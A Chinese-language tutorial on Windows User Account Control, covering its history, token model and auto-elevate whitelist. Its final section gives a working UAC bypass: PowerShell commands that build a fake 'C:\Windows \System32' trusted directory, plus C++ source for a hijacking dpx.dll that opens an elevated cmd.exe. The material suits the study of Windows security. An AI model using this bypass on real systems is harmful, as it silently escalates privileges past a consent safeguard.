User Account Control

用户帐户控制 (User Account Control，简称 UAC) 有助于防止恶意软件损坏电脑，并且有助于组织部署易于管理的桌面。借助 UAC，应用和任务将始终在非管理员帐户的安全上下文中运行，除非管理员专门授予管理员级别的访问系统权限。UAC 可阻止自动安装未经授权的应用并防止意外更改系统设置。

The Development Of UAC

在 Windows XP、Windows Server 2003 及之前的操作系统中，若想修改系统设置、修改系统文件或进行其他一系列需要管理员权限的操作，都必须使用管理员账户登录。普通用户没有任何手段转换权限。

以管理员账户登录系统的用户会拥有绝大多数权力，可以自由安装和移除所有软件、文件及系统服务。但由于管理员账户权限极大，容易导致间谍软件、恶意软件侵入系统，为此操作系统也容许用户以权限受限制的“受限的用户”（Users）身份进行日常操作，降低恶意程序危害系统的风险，提供安全性。然而 “受限的用户” 的权限限制较为严苛，无法进行许多系统设定和软件安装，对用户造成许多困扰。

在 Windows 2000 中，添加了运行在命令提示符中的 “runas.exe”，只要提供用户名和密码，就可以使用其他用户的身份运行指定程序。其后的在 Windows XP 和 Windows Server 2003 中，更是可以直接右键点击目标程序，然后点击 “运行方式” 以达到上述目的，这可以被视为日后用户账户控制的雏形。

进入 Windows Vista 时代之后，为了在 “系统管理员” 和 “标准用户” 两者之间的操作权限及安全性上获取平衡，因此出现了用户帐户控制（UAC）功能，主要目的是在弹性管理和保护系统安全上发挥制衡作用。相对于 Windows XP 中没有很多权利的 “标准用户” 身份模式，Windows Vista 的 UAC 功能适当调整了 “标准用户” 的权限，将部分管理权下放，容许标准用户创建 VPN、变更电源管理、安装重要系统更新等。同时，UAC 引进了几项群组原则设定，让 “标准用户” 能安装 “系统管理员” 核准的各种设备，如打印机驱动程序等，和从“系统管理员”许可的网站上安装ActiveX控件等。

当用户的某些动作可能会影响系统的安全及稳定性时，例如变更系统设置、运行未经微软认证的程序等，UAC 便会弹窗，要求用户予以确认或提供管理员的账户及密码。如果用户的组群是 “系统管理员”，则只需在弹出的对话框中选择 “允许” 或 “不允许”，如果用户的组群是“标准用户”，则需请求管理员的授权及密码。

How UAC Works

UAC process and interactions

每个需要管理员访问令牌的应用都必须提示征得用户同意。一个例外是父进程和子进程之间的关系。子进程从父进程继承用户的访问令牌。但是，父进程和子进程必须具有相同的完整性级别。Windows 标记进程的完整性级别来保护进程。完整性级别是信任的度量。"高"完整性应用程序是执行修改系统数据的任务（如磁盘分区应用程序）的应用程序，而"低"完整性应用程序是执行可能会损害操作系统的任务（如 Web 浏览器）的应用程序。完整性级别较低的应用无法修改完整性级别较高的应用程序中的数据。当标准用户尝试运行需要管理员访问令牌的应用时，UAC 要求用户提供有效的管理员凭据。

为了更好地了解此过程如何发生，让我们看一下 Windows 过程。

Logon Process

下图中显示了管理员的登录过程与标准用户的登录过程的区别。

默认情况下，标准用户和管理员都在标准用户的安全性上下文中访问资源和运行应用。当用户登录到计算机时，系统会为该用户创建访问令牌。访问令牌包含有关用户授予的访问级别的信息，包括特定安全标识符（SID）和相关 Windows 特权。

管理员登录后，会为用户创建两个单独的访问令牌：标准用户访问令牌和管理员访问令牌。标准用户访问令牌包含与管理员访问令牌相同的用户特定信息，只是移除了 Windows 管理特权以及相关 SID。标准用户访问令牌用于启动不执行管理任务的应用程序（标准用户应用程序）。当管理员需要执行高权限管理任务时，Windows 会自动提示用户批准，同意后，则允许使用管理员访问令牌。这里所说的管理员用户是位于管理员组中的用户，而 Administrator 为系统的超级管理员。

The UAC User Experience

启用 UAC 后，标准用户的用户体验与管理员用户的用户体验是不同的。使用内置 UAC 提升组件，标准用户可以通过输入本地管理员帐户的有效凭据轻松执行管理任务。标准用户的默认内置 UAC 提升组件是凭据提示。

  • 凭据提示

当标准用户尝试执行需要管理员访问令牌的任务时，将显示凭据提示。

  • 许可提示

当管理员用户尝试执行需要管理员访问令牌的任务时，将显示同意提示 。

White List Of UAC

当隶属于管理员组中的用户需要执行高权限任务时，系统就会弹窗来提示用户予以许可。然而，并非所有的特权可执行程序都会弹出 UAC 窗口。微软在用户账户控制中为一些系统程序设置了白名单机制，所有在白名单中的程序将不再询问，可以直接提升到管理员权限运行。例如以下几个常见的程序：

slui.exe
wusa.exe
taskmgr.exe
msra.exe
eudcedit.exe
eventvwr.exe
CompMgmtLauncher.exe
rundll32.exe
explorer.exe

这些程序都拥有一个共同的特性，就是Manifest信息中存在autoElevate属性且属性的值为True。

我们可以遍历出系统目录中所有存在autoElevate属性且属性值为True的程序。

由于白名单程序在运行时会自动提升至管理员权限，所以我们可以对这些程序进行 DLL 劫持、DLL 注入或者劫持注册表，当程序启动时我们就可以绕过 UAC 的控制进行一些高权限操作。

UAC Bypass By Mocking Trusted Directories

长期以来，白名单程序一直是Bypas UAC技术的核心。这些程序在运行时可以直接提升到管理员权限运行，而无需弹窗提示用户。并且它们都有一个共同的特点就是都具有 autoElevate 属性，且 autoElevate 属性的值为 True。

当白名单程序运行时，系统就会尝试读取其可执行文件的 Manifest 信息，并解析出 autoElevate 字段的值。如果 autoElevate 字段存在并且值为 True，那么系统会认为这是一个可以自动提升权限的程序，但是到最后的自动提升权限还需要通过两个条件的检查。系统还会检查可执行文件的签名，同时会对可执行文件的路径进行检查，需要可执行文件位于系统可信任目录中，例如 ”C:\Windows\System32“。当这三个检查全部通过后，系统将允许程序自动提升权限，有任意一个条件不通过都会被系统拒绝。

但是问题就出现在系统检查可信任目录时。Windows 相关 API 会自动去除可执行文件路径中出现的空格。也就是说如果可执行文件位于 “C:\Windows \System32” 目录（在“Windows”后有一个空格”）中，系统在检查时，会自动将路径变换为 “C:\Windows\System32”，而 “C:\Windows\System32” 正是一个系统可信任目录，这样就通过了可信任目录的检查。

基于此原理，攻击则可以根据可信任目录来创建一个包含空格的目录，并将一个白名单程序复制到包含空格的目录中。由于此时程序本身就是 Windows 系统的程序，所以可以直接通过前两个检查条件。然后通过 DLL 劫持等技术即可成功绕过系统 UAC。下面我们选用 wusa.exe 进行演示，该程序位于UAC白名单中，是 Windows 更新独立安装程序，位于 “C:\Windows\System32” 目录中。

在PowerShell里执行一下命令，通过Long UNC创建”C:\Windows \System32“目录，并将“C:\Windows\System32”目录中的 wusa.exe 复制过来。

New-Item "\\?\C:\Windows \System32" -ItemType Directory
Copy-Item C:\Windows\System32\wusa.exe "\\?\C:\Windows \System32\wusa.exe"

运行 ”C:\Windows \System32“ 目录中的 wusa.exe，同时使用 Process Monitor 检测其进程，过滤出加载的 DLL。

可以看到，wusa.exe 曾尝试在当前目录中加载过几个 DLL 文件，很明显会失败。不过我们可以编写一个恶意的 DLL 文件并将其放入该目录中进行 DLL 劫持。要注意构造的恶意 DLL 需要与原来的 DLL 具有相同导出函数。这里以 dpx.dll 为例进行劫持，编写如下 C++ 代码：

#include "pch.h"
#include <iostream>
#include <windows.h>

using namespace std;

#pragma comment (linker, "/export:DpxCheckJobExists=c:\\windows\\system32\\dpx.DpxCheckJobExists,@1")
#pragma comment (linker, "/export:DpxCheckJobExistsEx=c:\\windows\\system32\\dpx.DpxCheckJobExistsEx,@2")
#pragma comment (linker, "/export:DpxDeleteJob=c:\\windows\\system32\\dpx.DpxDeleteJob,@3")
#pragma comment (linker, "/export:DpxDeleteJobEx=c:\\windows\\system32\\dpx.DpxDeleteJobEx,@4")
#pragma comment (linker, "/export:DpxFreeMemory=c:\\windows\\system32\\dpx.DpxFreeMemory,@5")
#pragma comment (linker, "/export:DpxNewJob=c:\\windows\\system32\\dpx.DpxNewJob,@6")
#pragma comment (linker, "/export:DpxNewJobEx=c:\\windows\\system32\\dpx.DpxNewJobEx,@7")
#pragma comment (linker, "/export:DpxRestoreJob=c:\\windows\\system32\\dpx.DpxRestoreJob,@8")
#pragma comment (linker, "/export:DpxRestoreJobEx=c:\\windows\\system32\\dpx.DpxRestoreJobEx,@9")
#pragma comment (linker, "/export:DpxRestoreOrNewJob=c:\\windows\\system32\\dpx.DpxRestoreOrNewJob,@10")
#pragma comment (linker, "/export:DpxRestoreOrNewJobEx=c:\\windows\\system32\\dpx.DpxRestoreOrNewJobEx,@11")

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID)
{
 system("start cmd.exe");
 return true;
}

使用 VS 创建 DLL 项目进行编译，生成 64 为的 DLL 文件。

将生成的 dpx.dll 放到 ”C:\Windows \System32“ 目录中，然后启动  ”C:\Windows \System32\wusa.exe“ 即可以管理员权限打开一个命令行窗口。
